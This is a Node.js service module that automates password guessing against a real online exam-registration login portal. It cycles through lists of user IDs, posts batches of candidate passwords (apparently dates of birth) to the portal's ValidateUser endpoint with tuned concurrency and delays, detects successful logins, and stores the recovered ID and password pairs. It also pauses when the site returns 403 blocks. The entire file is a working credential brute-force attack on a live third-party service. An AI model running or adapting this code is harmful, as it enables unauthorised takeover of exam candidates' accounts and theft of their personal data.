"use strict";
var Promise = require("bluebird");
var request = require("request");
var cookieJar = request.jar();

var { Json, getRandomIntInclusive, convertToIST } = require("../utility");

const {
  getWorkingInfo,
  getDateSet,
  getUserSet,
  updateWorkingInfo,
  createLogReq,
  checkUserId,
  createIdStatus,
  updateIdStatus,
} = require("./request.service");

const baseUrl = "https://cdn3.digialm.com/EForms/";
const comData = "formId=66709&orgId=1631";
const comDataObj = {
  formId: "66709",
  orgId: "1631",
};

let count = 0;
let loopCount = 0;
let inProgressHandleError = false;
let currentDateSet = [];
let speed = {
  arrChunk: 36,
  concurrency: 4,
  startApiHitDelay: 700,
  runProgramDelay: 3000,
};

const fnTemplate = async () =>
  new Promise(async (resolve, reject) => {
    try {
      return true;
    } catch (e) {
      console.error(e);
      reject(e);
    }
  });

let localObj = {
  SERVER_NAME: "",
  SERVER: "",
  DATE_SET: "",
  USER_SET: "",
};

const setLocalObj = async () =>
  new Promise(async (resolve, reject) => {
    try {
      const dateSetName =
        (await Json.getJson("dateSetName")) || process.env.DATE_SET;
      const userSetName =
        (await Json.getJson("userSetName")) || process.env.USER_SET;
      let workingInfo = await Json.getJson("workingInfo");

      const serverName = workingInfo.serverName || process.env.SERVER_NAME;
      const server = workingInfo.server || process.env.SERVER;

      let tempLocalObj = {
        ...localObj,
        SERVER_NAME: serverName || "not set",
        SERVER: server || "not set",
        DATE_SET: dateSetName || "dateSetTest",
        USER_SET: userSetName || "userSetTest",
      };
      localObj = tempLocalObj;
      // console.log("localObj", localObj);
      Json.updateJson("dateSetName", dateSetName);
      Json.updateJson("userSetName", localObj.USER_SET);
      resolve(localObj);
    } catch (e) {
      console.error(e);
      reject(e);
    }
  });

const createLog = async (logType, workingInfo, userid = "") =>
  new Promise(async (resolve, reject) => {
    try {
      const logData = {
        serverName: localObj.SERVER_NAME,
        server: localObj.SERVER,
        userid: userid,
        count: count,
        lastUpdate: convertToIST(),
        logType: logType,
        workingInfo: workingInfo,
      };
      createLogReq(logData);
      Json.insertLog("log", logData);
      resolve(logData);
    } catch (e) {
      console.error(e);
      reject(e);
    }
  });

const updateLocalWorkingInfo = async (action = "") => {
  let flag = 0;
  let workingInfo = Json.getJson("workingInfo");
  workingInfo["lastUpdate"] = convertToIST();
  if (action == "apicall") {
    workingInfo["totalApiHit"] = workingInfo["totalApiHit"] + 1;
    flag = 1;
  } else if (action == "stop") {
    workingInfo["workingStatus"] = "stop";
    flag = 1;
  }

  if (flag == 1) {
    workingInfo = await Json.updateJson("workingInfo", workingInfo);
  }
  return workingInfo;
};

const handleError = async (userid = "") => {
  try {
    if (!inProgressHandleError) {
      inProgressHandleError = true;
      let workingInfo = Json.getJson("workingInfo");
      workingInfo["workingStatus"] = "stop";
      workingInfo["lastUpdate"] = convertToIST();
      workingInfo = await Json.updateJson("workingInfo", workingInfo);
      const workingInfoData = {
        serverName: localObj.SERVER_NAME,
        server: localObj.SERVER,
        ...workingInfo,
      };
      await updateWorkingInfo(workingInfoData);
      await createLog("error", workingInfo, userid);
      // let mailer = await Mailer.sendEmail(
      //   ["sumanm686@gmail.com"],
      //   localObj.SERVER + " calling error ✔",
      //   JSON.stringify(data, null, 2)
      // );
      setTimeout(async () => {
        inProgressHandleError = false;
        console.log("handleError 60000");
      }, 60000);
      return true;
    } else {
      return true;
    }
  } catch (e) {
    console.error(e);
    // throw Error("Error while handleError catch");
  }
};

const apiCall = async (data) =>
  new Promise(async (resolve, reject) => {
    try {
      const { userid, password } = data;
      console.log(userid, password);
      const hitUrl = "loginAction.do?subAction=ValidateUser";
      const url = `${baseUrl}${hitUrl}&${comData}&userid=${userid}&confData=${password}`;
      updateLocalWorkingInfo("apicall");
      request.post(
        {
          headers: { "content-type": "application/x-www-form-urlencoded" },
          url: url,
          body: "",
          jar: cookieJar,
        },
        async (error, response, body) => {
          try {
            count = count + 1;
            if (error) {
              await handleError();
              reject(error); // calling `reject` will cause the promise to fail with or without the error passed as an argument
              console.error(`Error while apiCall error - ${error}`);
              return; // and we don't want to go any further
            } else if (
              response.statusCode == 403 ||
              response.statusCode == "403"
            ) {
              console.log(
                response.statusCode,
                userid,
                password,
                count,
                loopCount
              );
              console.log(JSON.stringify(response));
              await handleError();
              console.error(
                `Error while apiCall response - ${response.statusCode}`
              );
              reject(403);
            } else if (
              response.statusCode == 200 ||
              response.statusCode == "200"
            ) {
              console.log(
                response.statusCode,
                userid,
                password,
                count,
                loopCount
              );
              console.log(body);
              let dataInp = {
                userid: userid,
                confData: password,
              };
              // const parser = new htmlparser2.Parser({
              //   onopentag(name, attributes) {
              //     if (name === "input") {
              //       console.log(attributes.name, attributes.value);
              //       dataInp[attributes.name] = attributes.value;
              //     }
              //   },
              // });
              // parser.write(body);
              // parser.end();
              resolve(dataInp);
            } else if (
              response.statusCode == 302 ||
              response.statusCode == "302"
            ) {
              const location = response.headers
                ? response.headers.location || ""
                : "";
              if (location.includes("ERRORCODE=f%2F4qMxMdXNINdWz%")) {
                console.log(response.statusCode, count);
                console.log(JSON.stringify(response));
                console.log(
                  "location",
                  location,
                  location.includes("ERRORCODE=f%2F4qMxMdXNINdWz%")
                );
                resolve("Incorrect Credentials.");
              } else {
                resolve("");
              }
            } else {
              console.log(response.statusCode, count);
              console.log(JSON.stringify(response));
              resolve("");
            }
          } catch (e) {
            console.error(e);
            await handleError();
            reject(e); // calling `reject` will cause the promise to fail with or without the error passed as an argument
          }
        }
      );
    } catch (e) {
      console.error(e);
      await handleError();
      reject(e);
    }
  });

let dateSetChunk = [];
let startDateTime = convertToIST();

const handleStartApiHit = (userid, data) =>
  new Promise(async (resolve, reject) => {
    try {
      if (!dateSetChunk.length) {
        var i,
          j,
          temparray,
          chunk = speed.arrChunk;
        for (i = 0, j = data.length; i < j; i += chunk) {
          temparray = data.slice(i, i + chunk);
          dateSetChunk.push(temparray);
          // do whatever
        }
      }
      console.log(userid, count, loopCount);
      startApiHit(userid, dateSetChunk.shift());
      resolve(dateSetChunk);
    } catch (e) {
      console.error(e);
      reject(e);
      // throw Error("Error while handleStartApiHit");
    }
  });

const startApiHit = (userid, data) =>
  new Promise(async (resolve, reject) => {
    try {
      let newData = [];
      for (let i = 0; i < data.length; i++) {
        newData.push({ userid: userid, password: data[i] });
      }
      // Promise.all(promises).
      cookieJar = request.jar();
      console.log("startApiHit ====>");
      Promise.map(newData, apiCall, { concurrency: speed.concurrency })
        .then(async (results) => {
          try {
            results = results.filter((item) => !(item == ""));
            let workingInfo = Json.getJson("workingInfo");
            const endDateTime = convertToIST();
            if (results.length) {
              let resData = results[0];
              if (resData.userid && resData.confData) {
                updateIdStatus({
                  userid: resData.userid,
                  confData: resData.confData,
                  status: "found",
                });
                workingInfo["found"] = workingInfo["found"] + 1;
                workingInfo["currentFound"] = workingInfo["currentFound"] + 1;
              } else {
                updateIdStatus({ userid: userid, status: "error" });
                workingInfo["error"] = workingInfo["error"] + 1;
                workingInfo["notFound"] = workingInfo["notFound"] + 1;
              }
              dateSetChunk = [];
            } else if (!dateSetChunk.length && !results.length) {
              updateIdStatus({ userid: userid, status: "notFound" });
              workingInfo["notFound"] = workingInfo["notFound"] + 1;
            }
            if (dateSetChunk.length) {
              if (workingInfo["workingStatus"] == "stop") {
                console.log(
                  "workingStatus  => stop, start time -> ",
                  startDateTime,
                  "end time -> ",
                  endDateTime,
                  userid,
                  workingInfo["userIdsIndex"]
                );
              } else {
                setTimeout(() => {
                  handleStartApiHit(userid, []);
                }, speed.startApiHitDelay);
              }
            } else {
              workingInfo["userIdsIndex"] = workingInfo["userIdsIndex"] + 1;
              workingInfo["lastUpdate"] = endDateTime;
              workingInfo = await Json.updateJson("workingInfo", workingInfo);
              setTimeout(() => {
                runProgram(true);
              }, speed.runProgramDelay);
              console.log(
                "start time -> ",
                startDateTime,
                "end time -> ",
                endDateTime,
                userid,
                workingInfo["userIdsIndex"]
              );
              console.timeLog("startApiHit");
              console.timeEnd("currentSpeed");
            }
            resolve(results);
          } catch (e) {
            console.error(e);
            reject(e);
            // throw Error("Error while startApiHit Promise.map");
          }
        })
        .catch((err) => {
          console.error(err);
        });
    } catch (e) {
      console.error(e);
      reject(e);
      // throw Error("Error while startApiHit");
    }
  });

const getUserid = async () =>
  new Promise(async (resolve, reject) => {
    try {
      let workingInfo = await Json.getJson("workingInfo");
      const userSet = await Json.getJson("userSet");
      userSet[workingInfo["userIdsIndex"]];
      const userSetLen = userSet.length;

      if (workingInfo["userIdsIndex"] == userSetLen) {
        resolve("STET251754");
        return "STET251754";
      }
      const useridFound = await checkUserId(
        userSet[workingInfo["userIdsIndex"]]
      );
      console.log("getUserid useridFound", useridFound);
      if (useridFound && useridFound.userid) {
        workingInfo["userIdsIndex"] = workingInfo["userIdsIndex"] + 1;
        workingInfo["lastUpdate"] = convertToIST();
        workingInfo = await Json.updateJson("workingInfo", workingInfo);
        const userid = await getUserid();
        resolve(userid);
      } else {
        resolve(userSet[workingInfo["userIdsIndex"]]);
      }
    } catch (e) {
      console.error(e);
      reject(e);
      // throw Error("Error while stet api service getUserId");
    }
  });

const runProgram = async (isPro = false) => {
  try {
    console.log(" ");
    startDateTime = convertToIST();
    loopCount = loopCount + 1;
    console.log("start runProgram", startDateTime);
    let workingInfo = await Json.getJson("workingInfo");
    const userSet = await Json.getJson("userSet");
    const dateSet = await Json.getJson("dateSet");
    // console.log("data =>>>>", userSet, dateSet);
    let userid = "";
    const userSetLen = userSet.length || 0;
    console.log("workingStatus", workingInfo["workingStatus"]);
    if (!isPro && workingInfo["workingStatus"] == "inprocess") {
      return workingInfo;
    } else if (workingInfo["workingStatus"] == "stop") {
      return workingInfo;
    } else if (workingInfo["workingStatus"] == "completed") {
      return workingInfo;
    } else if (workingInfo["userIdsIndex"] < userSetLen) {
      userid = await getUserid();
      console.log("cur userid => ", userid);
      workingInfo = await Json.getJson("workingInfo");
      workingInfo["lastWorkingId"] = userid;
      workingInfo["totaluserIds"] = userSetLen;
      workingInfo["workingStatus"] = "inprocess";
      workingInfo["lastUpdate"] = startDateTime;
      console.time("currentSpeed");
      createIdStatus({
        userid: userid,
        status: "inprogress",
        userSetName: workingInfo.userSet,
        dateSetName: workingInfo.dateSet,
      });
      handleStartApiHit(userid, dateSet);
    } else if (workingInfo["userIdsIndex"] == userSetLen) {
      const cpDateSet = workingInfo["cpDateSet"];
      const cpuserSet = workingInfo["cpuserSet"];
      cpDateSet.push(workingInfo.dateSet);
      cpuserSet.push(workingInfo.userSet);
      workingInfo["workingStatus"] = "completed";
      workingInfo["oldTotalApiHitA"] = workingInfo["oldTotalApiHit"];
      workingInfo["lastTotalApiHit"] = workingInfo["totalApiHit"];
      workingInfo["oldTotalApiHit"] =
        workingInfo["totalApiHit"] + workingInfo["oldTotalApiHit"];
      workingInfo["lastUpdate"] = startDateTime;
      await createLog("complete", workingInfo, "");

      // let mailer = await Mailer.sendEmail(
      //   ["sumanm686@gmail.com"],
      //   localObj.SERVER + " calling completed ✔",
      //   JSON.stringify(workingInfo, null, 2)
      // );
      console.log("work done");
    } else {
      workingInfo["workingStatus"] = "stop";
      workingInfo["lastUpdate"] = startDateTime;
    }
    const workingInfoData = {
      serverName: localObj.SERVER_NAME,
      server: localObj.SERVER,
      ...workingInfo,
    };
    await updateWorkingInfo(workingInfoData);
    workingInfo = await Json.updateJson("workingInfo", workingInfo);
    return workingInfo;
  } catch (e) {
    console.error(e);
    // throw Error("Error while runProgram");
  }
};

const stetStartProgram = async () =>
  new Promise(async (resolve, reject) => {
    try {
      console.log("stetStartProgram ================> ");
      let status = "not start";
      let workingInfo = await Json.getJson("workingInfo");
      let oldWorkingStatus = workingInfo["workingStatus"];
      console.time("startApiHit");
      workingInfo["currentFound"] = 0;
      workingInfo["workingStatus"] = "";
      workingInfo["lastUpdate"] = convertToIST();
      workingInfo["startTime"] = convertToIST();
      workingInfo = await Json.updateJson("workingInfo", workingInfo);
      const workingInfoData = {
        serverName: localObj.SERVER_NAME,
        server: localObj.SERVER,
        ...workingInfo,
      };
      updateWorkingInfo(workingInfoData);
      await stetSetSpeed();
      if (oldWorkingStatus == "inprocess") {
        status = "start after 65sec";
        setTimeout(async () => {
          workingInfo = Json.getJson("workingInfo");
          workingInfo["workingStatus"] = "";
          workingInfo["lastUpdate"] = convertToIST();
          workingInfo = await Json.updateJson("workingInfo", workingInfo);
          status = "started, setTimeout is over";
          await createLog("start", workingInfo, "");
          workingInfo = await runProgram();
          console.log("stetStart 65000");
        }, 65000);
      } else {
        status = "started";
        workingInfo["workingStatus"] = "";
        workingInfo = await Json.updateJson("workingInfo", workingInfo);
        await createLog("start", workingInfo, "");
        workingInfo = await runProgram();
      }
      resolve({ status: status, ...workingInfo });
    } catch (e) {
      console.error(e);
      reject(e);
    }
  });

const stetSetSpeed = async (token = 0) =>
  new Promise(async (resolve, reject) => {
    try {
      let workingInfo = await Json.getJson("workingInfo");
      if (workingInfo && workingInfo.speed) {
        speed = {
          arrChunk: workingInfo.speed.arrChunk || 36,
          concurrency: workingInfo.speed.concurrency || 4,
          startApiHitDelay: workingInfo.speed.startApiHitDelay || 700,
          runProgramDelay: workingInfo.speed.runProgramDelay || 3000,
        };
      } else {
        speed = {
          arrChunk: 36,
          concurrency: 4,
          startApiHitDelay: 700,
          runProgramDelay: 3000,
        };
      }
      resolve(workingInfo);
    } catch (e) {
      console.error(e);
      reject(e);
      // throw Error("Error while stet login service fnTemplate");
    }
  });

const stetUpdateDateSet = async () =>
  new Promise(async (resolve, reject) => {
    try {
      const dateSetRes = await getDateSet();
      const dateSetStore = await Json.getJson("dateSet");
      currentDateSet = dateSetStore || [];
      resolve(dateSetStore);
    } catch (e) {
      console.error(e);
      reject({
        message: "Error while update date set",
        data: e,
        error: e,
        step: 2,
      });
      // throw Error("Error while stet login service fnTemplate");
    }
  });

const stetUpdateUserSet = async () =>
  new Promise(async (resolve, reject) => {
    try {
      const userSetRes = await getUserSet();
      const userSetStore = (await Json.getJson("userSet")) || [];
      resolve(userSetStore);
    } catch (e) {
      console.error(e);
      reject({
        message: "Error while update user set",
        data: e,
        error: e,
        step: 3,
      });
      // throw Error("Error while stet login service fnTemplate");
    }
  });

const stetPreStart = async () =>
  new Promise(async (resolve, reject) => {
    try {
      const dateSet = await stetUpdateDateSet();
      const userSet = await stetUpdateUserSet();
      if (dateSet.length && userSet.length) {
        resolve({
          message: "succes",
          succes: true,
          data: {
            updated: true,
          },
          error: null,
        });
      } else if (!dateSet.length && userSet.length) {
        reject({
          message: "date set not found",
          succes: false,
          data: null,
          error: "date set not found",
        });
      } else if (dateSet.length && !userSet.length) {
        reject({
          message: "user set not found",
          succes: false,
          data: null,
          error: "user set not found",
        });
      } else {
        reject({
          message: "something went wrong try again",
          succes: false,
          data: null,
          error: "something went wrong try again",
        });
      }
    } catch (e) {
      console.log(".....................");
      console.error(e);
      reject(e);
      // throw Error("Error while stet login service fnTemplate");
    }
  });

const stetTokenVerify = async (token = 0) =>
  new Promise(async (resolve, reject) => {
    try {
      let ramNumber = getRandomIntInclusive();
      let workingInfo = await Json.getJson("workingInfo");
      if (workingInfo && workingInfo["tokenNumber"] === token) {
        workingInfo["lastUpdate"] = convertToIST();
        workingInfo["tokenNumber"] = ramNumber;
        updateWorkingInfo(workingInfo);
        resolve(true);
      } else {
        reject({
          message: "invalide token",
          error: "invalide token",
          data: workingInfo,
          step: 1,
        });
      }
    } catch (e) {
      console.error(e);
      reject(e);
      // throw Error("Error while stet login service fnTemplate");
    }
  });

const stetStart = async (token, uSetName) =>
  new Promise(async (resolve, reject) => {
    try {
      await setLocalObj();
      if (uSetName) {
        await Json.updateJson("userSetName", uSetName);
      } else {
        await Json.updateJson("userSetName", localObj.USER_SET);
      }
      const workingInfoRes = await getWorkingInfo();
      const tokenVerify = await stetTokenVerify(token);
      const stetPreStartRes = await stetPreStart();
      const stetStartProgramRes = await stetStartProgram();
      await setLocalObj();
      resolve(stetStartProgramRes);
    } catch (e) {
      console.log(".....................");
      console.error(e);
      reject(e);
      // throw Error("Error while stet login service fnTemplate");
    }
  });

const stetStop = async () =>
  new Promise(async (resolve, reject) => {
    try {
      await setLocalObj();
      let workingInfo = await Json.getJson("workingInfo");
      workingInfo["workingStatus"] = "stop";
      workingInfo["lastUpdate"] = convertToIST();
      workingInfo = await Json.updateJson("workingInfo", workingInfo);
      await createLog("stop", workingInfo, "");
      updateWorkingInfo(workingInfo);
      resolve(workingInfo);
    } catch (e) {
      console.error(e);
      reject(e);
    }
  });

const stetStatus = async () =>
  new Promise(async (resolve, reject) => {
    try {
      await setLocalObj();
      let workingInfo = await Json.getJson("workingInfo");
      // console.log("workingInfo", workingInfo);
      if (!workingInfo.dateSet && !workingInfo.userSet) {
        const workingInfoRes = await getWorkingInfo();
        workingInfo = await Json.getJson("workingInfo");
      }
      await setLocalObj();
      resolve(workingInfo);
    } catch (e) {
      console.error(e);
      reject(e);
      // throw Error("Error while stet login service fnTemplate");
    }
  });

const stetUpdateWorkingInfo = async () =>
  new Promise(async (resolve, reject) => {
    try {
      await setLocalObj();
      const workingInfoRes = await getWorkingInfo();
      let workingInfo = await Json.getJson("workingInfo");
      await setLocalObj();
      resolve(workingInfo);
    } catch (e) {
      console.error(e);
      reject(e);
      // throw Error("Error while stet login service fnTemplate");
    }
  });

module.exports = {
  stetStart,
  stetStartProgram,
  stetStop,
  stetStatus,
  stetPreStart,
  stetUpdateWorkingInfo,
};
